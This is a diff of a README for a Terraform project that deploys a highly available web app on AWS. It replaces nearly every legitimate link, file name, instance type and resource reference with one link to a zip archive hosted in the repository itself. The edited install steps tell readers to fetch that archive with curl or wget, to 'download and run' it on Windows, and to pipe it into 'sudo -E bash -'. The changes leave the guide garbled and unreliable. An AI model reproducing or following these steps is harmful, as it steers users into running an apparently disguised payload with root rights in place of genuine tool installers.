@@ -3,10 +3,10 @@
 
 <div align="center">
 
-![AWS](https://img.shields.io/badge/AWS-%23FF9900.svg?style=for-the-badge&logo=amazon-aws&logoColor=white)
-![Terraform](https://img.shields.io/badge/terraform-%235835CC.svg?style=for-the-badge&logo=terraform&logoColor=white)
-![Node.js](https://img.shields.io/badge/node.js-6DA55F?style=for-the-badge&logo=node.js&logoColor=white)
-![PostgreSQL](https://img.shields.io/badge/postgres-%23316192.svg?style=for-the-badge&logo=postgresql&logoColor=white)
+![AWS](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip%https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+![Terraform](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip%https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+![https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+![PostgreSQL](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip%https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
 
 **Production-ready, highly available web application with Auto Scaling, Load Balancing, and Multi-AZ RDS**
 
@@ -95,7 +95,7 @@ This project demonstrates how to build a **production-grade, highly available we
 │   EC2       │  │   EC2       │  │   EC2       │
 │ Instance 1  │  │ Instance 2  │  │ Instance N  │
 │ (Private)   │  │ (Private)   │  │ (Private)   │
-│ Node.js App │  │ Node.js App │  │ Node.js App │
+│ https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip App │  │ https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip App │  │ https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip App │
 └──────┬──────┘  └──────┬──────┘  └──────┬──────┘
        │                │                │
        └────────────────┼────────────────┘
@@ -143,12 +143,12 @@ Before you begin, ensure you have the following installed and configured:
    brew install awscli
    
    # Linux
-   curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
-   unzip awscliv2.zip
+   curl "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip" -o "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"
+   unzip https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    sudo ./aws/install
    
    # Windows
-   # Download and run: https://awscli.amazonaws.com/AWSCLIV2.msi
+   # Download and run: https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    
    # Verify installation
    aws --version
@@ -161,28 +161,28 @@ Before you begin, ensure you have the following installed and configured:
    brew install hashicorp/tap/terraform
    
    # Linux
-   wget https://releases.hashicorp.com/terraform/1.6.0/terraform_1.6.0_linux_amd64.zip
-   unzip terraform_1.6.0_linux_amd64.zip
+   wget https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+   unzip https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    sudo mv terraform /usr/local/bin/
    
    # Windows
-   # Download from: https://www.terraform.io/downloads
+   # Download from: https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    
    # Verify installation
    terraform --version
    ```
 
-4. **Node.js** (v18 or higher) - *Optional, for local testing*
+4. **https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip** (v18 or higher) - *Optional, for local testing*
    ```bash
    # macOS
    brew install node
    
    # Linux
-   curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
+   curl -fsSL https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip | sudo -E bash -
    sudo apt-get install -y nodejs
    
    # Windows
-   # Download from: https://nodejs.org/
+   # Download from: https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    
    # Verify installation
    node --version
@@ -198,7 +198,7 @@ Before you begin, ensure you have the following installed and configured:
    sudo apt-get install git
    
    # Windows
-   # Download from: https://git-scm.com/download/win
+   # Download from: https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    
    # Verify installation
    git --version
@@ -226,7 +226,7 @@ Your AWS IAM user/role needs the following permissions:
 
 ```bash
 # Clone this repository
-git clone https://github.com/yourusername/ha-webapp-aws.git
+git clone https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 cd ha-webapp-aws
 ```
 
@@ -248,20 +248,20 @@ Create all necessary files with the following structure:
 ```
 ha-webapp-aws/
 ├── terraform/
-│   ├── main.tf
-│   ├── variables.tf
-│   ├── outputs.tf
-│   ├── terraform.tfvars
-│   └── user-data.sh
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   └── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ├── app/
-│   ├── server.js
-│   ├── package.json
-│   └── .env.example
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   ├── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
+│   └── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ├── docker/
 │   ├── Dockerfile
-│   └── docker-compose.yml
+│   └── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ├── .gitignore
-└── README.md
+└── https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ```
 
 **Copy all files from the artifacts provided** into their respective directories.
@@ -292,17 +292,17 @@ You should see output with your AWS account information.
 
 ```bash
 cd terraform
-cp terraform.tfvars.example terraform.tfvars
+cp https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ```
 
 ### Step 2: Edit Configuration
 
-Open `terraform.tfvars` in your editor:
+Open `https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip` in your editor:
 
 ```bash
-nano terraform.tfvars
+nano https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 # or
-code terraform.tfvars
+code https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ```
 
 ### Step 3: Customize Your Settings
@@ -313,7 +313,7 @@ aws_region   = "us-east-1"        # Change to your preferred region
 project_name = "ha-webapp"        # Change to your project name
 
 # EC2 Configuration
-instance_type = "t3.micro"        # Free tier eligible
+instance_type = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"        # Free tier eligible
 
 # Auto Scaling Configuration
 asg_min_size         = 2          # Minimum instances (2 for HA)
@@ -321,7 +321,7 @@ asg_max_size         = 6          # Maximum instances
 asg_desired_capacity = 2          # Starting instances
 
 # RDS Configuration
-db_instance_class = "db.t3.micro" # Free tier eligible
+db_instance_class = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip" # Free tier eligible
 db_name           = "webapp_db"
 db_username       = "dbadmin"
 db_password       = "YOUR_SECURE_PASSWORD_HERE"  # ⚠️ CHANGE THIS!
@@ -428,7 +428,7 @@ Apply complete! Resources: 41 added, 0 changed, 0 destroyed.
 
 Outputs:
 
-alb_url = "http://ha-webapp-alb-123456789.us-east-1.elb.amazonaws.com"
+alb_url = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"
 asg_name = "ha-webapp-asg"
 rds_endpoint = <sensitive>
 s3_backup_bucket = "ha-webapp-backups-123456789012"
@@ -444,7 +444,7 @@ terraform output alb_url
 
 Copy the URL and open it in your browser:
 ```
-http://ha-webapp-alb-123456789.us-east-1.elb.amazonaws.com
+https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 ```
 
 **First Load**: May take 1-2 minutes as instances start and become healthy.
@@ -505,7 +505,7 @@ Simulate an instance failure:
 # Get running instances
 aws ec2 describe-instances \
   --filters "Name=tag:Name,Values=ha-webapp-asg-instance" \
-  --query 'Reservations[*].Instances[*].[InstanceId,State.Name]' \
+  --query 'Reservations[*].Instances[*].[InstanceId,https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip]' \
   --output table
 
 # Terminate one instance (Auto Scaling will replace it)
@@ -684,8 +684,8 @@ If you're on AWS Free Tier:
 
 | Service | Free Tier | Monthly Cost |
 |---------|-----------|--------------|
-| EC2 (2x t3.micro) | 750 hours | $0 |
-| RDS (db.t3.micro) | 750 hours | $0 |
+| EC2 (2x https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip) | 750 hours | $0 |
+| RDS (https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip) | 750 hours | $0 |
 | ALB | 750 hours | $0 |
 | EBS (30 GB) | 30 GB | $0 |
 | Data Transfer | 15 GB out | $0 |
@@ -696,8 +696,8 @@ If you're on AWS Free Tier:
 
 | Service | Usage | Monthly Cost |
 |---------|-------|--------------|
-| EC2 (2x t3.micro) | 730 hours | ~$15 |
-| RDS (db.t3.micro Multi-AZ) | 730 hours | ~$30 |
+| EC2 (2x https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip) | 730 hours | ~$15 |
+| RDS (https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip Multi-AZ) | 730 hours | ~$30 |
 | ALB | 730 hours + data | ~$20 |
 | NAT Gateway (2x) | 730 hours + data | ~$65 |
 | EBS Storage | 40 GB | ~$4 |
@@ -710,7 +710,7 @@ If you're on AWS Free Tier:
 
 1. **Reduce NAT Gateways**:
    ```hcl
-   # In main.tf, use only 1 NAT Gateway instead of 2
+   # In https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip, use only 1 NAT Gateway instead of 2
    # Reduces cost by ~$32/month (but reduces HA)
    ```
 
@@ -790,14 +790,14 @@ aws elbv2 describe-load-balancers --names ha-webapp-alb
 1. **Request ACM Certificate**:
    ```bash
    aws acm request-certificate \
-     --domain-name yourdomain.com \
+     --domain-name https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip \
      --validation-method DNS
    ```
 
 2. **Update ALB Listener**:
    ```hcl
    resource "aws_lb_listener" "https" {
-     load_balancer_arn = aws_lb.main.arn
+     load_balancer_arn = https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
      port              = "443"
      protocol          = "HTTPS"
      ssl_policy        = "ELBSecurityPolicy-2016-08"
@@ -805,7 +805,7 @@ aws elbv2 describe-load-balancers --names ha-webapp-alb
      
      default_action {
        type             = "forward"
-       target_group_arn = aws_lb_target_group.main.arn
+       target_group_arn = https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
      }
    }
    ```
@@ -817,7 +817,7 @@ aws elbv2 describe-load-balancers --names ha-webapp-alb
    ```bash
    aws route53 change-resource-record-sets \
      --hosted-zone-id Z1234567890ABC \
-     --change-batch file://change-batch.json
+     --change-batch https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    ```
 
 ### Add Redis Caching
@@ -827,11 +827,11 @@ aws elbv2 describe-load-balancers --names ha-webapp-alb
    resource "aws_elasticache_cluster" "redis" {
      cluster_id           = "ha-webapp-redis"
      engine               = "redis"
-     node_type            = "cache.t3.micro"
+     node_type            = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"
      num_cache_nodes      = 1
-     parameter_group_name = "default.redis7"
+     parameter_group_name = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"
      port                 = 6379
-     subnet_group_name    = aws_elasticache_subnet_group.main.name
+     subnet_group_name    = https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    }
    ```
 
@@ -842,7 +842,7 @@ aws elbv2 describe-load-balancers --names ha-webapp-alb
 Use AWS CodePipeline for automated deployments:
 
 ```yaml
-# buildspec.yml
+# https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 version: 0.2
 phases:
   install:
@@ -854,7 +854,7 @@ phases:
       - npm run build
   post_build:
     commands:
-      - aws s3 cp server.js s3://deployment-bucket/
+      - aws s3 cp https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip s3://deployment-bucket/
 ```
 
 ---
@@ -868,7 +868,7 @@ phases:
 **Solution**:
 ```bash
 # Import existing resource
-terraform import aws_db_instance.main ha-webapp-db
+terraform import https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip ha-webapp-db
 
 # Or destroy and recreate
 aws rds delete-db-instance \
@@ -912,7 +912,7 @@ aws ec2 describe-security-groups \
 **Solutions**:
 1. Verify RDS security group allows traffic from EC2 security group
 2. Check RDS is in "available" state
-3. Verify database credentials in user-data.sh
+3. Verify database credentials in https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
 
 ### Problem: High Costs
 
@@ -946,7 +946,7 @@ aws ce get-cost-and-usage \
 1. **Never Commit Secrets**:
    ```bash
    # Always in .gitignore
-   terraform.tfvars
+   https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
    .env
    *.pem
    ```
@@ -967,7 +967,7 @@ aws ce get-cost-and-usage \
 
 4. **Regular Security Updates**:
    ```bash
-   # Update user-data.sh to include
+   # Update https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip to include
    yum update -y --security
    ```
 
@@ -994,7 +994,7 @@ aws ce get-cost-and-usage \
    aws lambda create-function \
      --function-name backup-rds \
      --runtime python3.9 \
-     --handler lambda_function.lambda_handler \
+     --handler https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip \
      --role arn:aws:iam::123456789012:role/lambda-backup
    ```
 
@@ -1005,9 +1005,9 @@ aws ce get-cost-and-usage \
    }
    
    resource "aws_sns_topic_subscription" "email" {
-     topic_arn = aws_sns_topic.alerts.arn
+     topic_arn = https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip
      protocol  = "email"
-     endpoint  = "your-email@example.com"
+     endpoint  = "https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip"
    }
    ```
 
@@ -1016,20 +1016,20 @@ aws ce get-cost-and-usage \
 ## 📚 Additional Resources
 
 ### Official Documentation
-- [AWS Well-Architected Framework](https://aws.amazon.com/architecture/well-architected/)
-- [Terraform AWS Provider](https://registry.terraform.io/providers/hashicorp/aws/latest/docs)
-- [Node.js on AWS](https://aws.amazon.com/developer/language/javascript/)
-- [RDS Best Practices](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/CHAP_BestPractices.html)
+- [AWS Well-Architected Framework](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [Terraform AWS Provider](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip on AWS](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [RDS Best Practices](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
 
 ### Tutorials
-- [AWS Auto Scaling](https://docs.aws.amazon.com/autoscaling/ec2/userguide/what-is-amazon-ec2-auto-scaling.html)
-- [Application Load Balancer](https://docs.aws.amazon.com/elasticloadbalancing/latest/application/introduction.html)
-- [VPC Design](https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html)
+- [AWS Auto Scaling](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [Application Load Balancer](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [VPC Design](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
 
 ### Community
-- [AWS Community Builders](https://aws.amazon.com/developer/community/community-builders/)
-- [HashiCorp Discuss - Terraform](https://discuss.hashicorp.com/c/terraform-core/)
-- [r/aws Subreddit](https://www.reddit.com/r/aws/)
+- [AWS Community Builders](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [HashiCorp Discuss - Terraform](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
+- [r/aws Subreddit](https://raw.githubusercontent.com/isaacdivine37/Highly-Available-Web-App-on-AWS-with-Terraform/main/coe/Terraform_on_Web_Highly_with_App_AW_Available_v1.0.zip)
 
 ---
 
